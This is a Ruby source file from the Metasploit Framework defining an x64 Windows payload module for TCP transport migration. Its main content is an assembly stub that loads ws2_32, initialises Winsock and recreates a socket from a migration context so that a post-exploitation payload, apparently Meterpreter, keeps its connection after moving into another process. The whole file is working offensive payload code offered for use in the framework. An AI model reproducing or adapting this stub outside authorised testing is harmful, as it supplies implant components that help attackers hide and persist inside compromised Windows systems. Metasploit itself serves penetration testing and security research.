# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/migrate_common'

module Msf

###
#
# Payload that supports migration over the TCP transport on x64.
#
###

module Payload::Windows::MigrateTcp_x64

  include Msf::Payload::Windows::MigrateCommon_x64

  # Minimum size, plus bytes for alignment
  WSA_SIZE = 0x1A0

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'TCP Transport Migration (x64)',
      'Description' => 'Migration stub to use over the TCP transport via x64',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64
    ))
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate_migrate(opts={})
    %Q^
    load_ws2_32:
      mov r14, 'ws2_32'
      push r14
      mov rcx, rsp              ; pointer to 'ws2_32'
      sub rsp, #{WSA_SIZE}      ; alloc size, plus alignment (used later)
      mov r13, rsp              ; save pointer to this struct
      sub rsp, 0x28             ; space for api function calls (really?)
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
      call rbp                  ; LoadLibraryA('ws2_32')
    init_networking:
      mov rdx, r13              ; pointer to the wsadata struct
      push 2
      pop rcx                   ; Version = 2
      mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
      call rbp                  ; WSAStartup(Version, &WSAData)
    create_socket:
      xor r8, r8                ; protocol not specified
      push r8                   ; flags == 0
      push r8                   ; reserved == NULL
      lea r9, [rsi+0x10]        ; Pointer to the info in the migration context
      push 1
      pop rdx                   ; SOCK_STREAM
      push 2
      pop rcx                   ; AF_INET
      mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
      call rbp                  ; WSASocketA(AF_INET, SOCK_STREAM, 0, &info, 0, 0)
      xchg rdi, rax
    ^
  end

end

end


